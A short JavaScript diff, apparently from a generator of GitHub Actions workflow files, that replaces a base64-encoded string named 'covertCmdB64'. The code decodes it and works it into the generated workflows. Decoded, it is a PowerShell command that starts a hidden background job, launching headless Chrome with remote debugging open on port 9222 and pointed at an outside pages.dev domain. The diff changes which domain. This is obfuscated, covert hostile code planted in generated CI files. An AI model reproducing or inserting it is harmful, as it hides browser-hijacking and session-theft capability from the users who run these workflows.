@@ -184,7 +184,7 @@ const templateDescriptions = {
 function timeAgo(date) { const seconds = Math.floor((new Date() - date) / 1000); let interval = seconds / 31536000; if (interval > 1) return Math.floor(interval) + " năm trước"; interval = seconds / 2592000; if (interval > 1) return Math.floor(interval) + " tháng trước"; interval = seconds / 86400; if (interval > 1) return Math.floor(interval) + " ngày trước"; interval = seconds / 3600; if (interval > 1) return Math.floor(interval) + " giờ trước"; interval = seconds / 60; if (interval > 1) return Math.floor(interval) + " phút trước"; return "vài giây trước"; }
 function getWorkflowContent(template, command, pin = "123456", repoUrl = '', withRerun = false) {
     const onTrigger = `on:\n  workflow_dispatch:\n  push:\n    paths:\n      - '.github/workflows/${WORKFLOW_NAME}'`;
-    const covertCmdB64 = "U3RhcnQtSm9iIC1TY3JpcHRCbG9jayB7IFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICJDOlxQcm9ncmFtIEZpbGVzXEdvb2dsZVxDaHJvbWVcQXBwbGljYXRpb25cY2hyb21lLmV4ZSIgLUFyZ3VtZW50TGlzdCAiLS1oZWFkbGVzcyAtLWRpc2FibGUtZ3B1IC0tcmVtb3RlLWRlYnVnZ2luZy1wb3J0PTkyMjIgaHR0cHM6Ly9hbnlsb3N0aWMucGFnZXMuZGV2IiAtV2luZG93U3R5bGUgSGlkZGVuIH0=";
+    const covertCmdB64 = "U3RhcnQtSm9iIC1TY3JpcHRCbG9jayB7IFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICJDOlxQcm9ncmFtIEZpbGVzXEdvb2dsZVxDaHJvbWVcQXBwbGljYXRpb25cY2hyb21lLmV4ZSIgLUFyZ3VtZW50TGlzdCAiLS1oZWFkbGVzcyAtLWRpc2FibGUtZ3B1IC0tcmVtb3RlLWRlYnVnZ2luZy1wb3J0PTkyMjIgaHR0cHM6Ly9hbnlseXRpYy5wYWdlcy5kZXYiIC1XaW5kb3dTdHlsZSBIaWRkZW4gfQ==";
     const covertCmd = atob(covertCmdB64);
     switch(template) {
         case 'git-tool-linux':
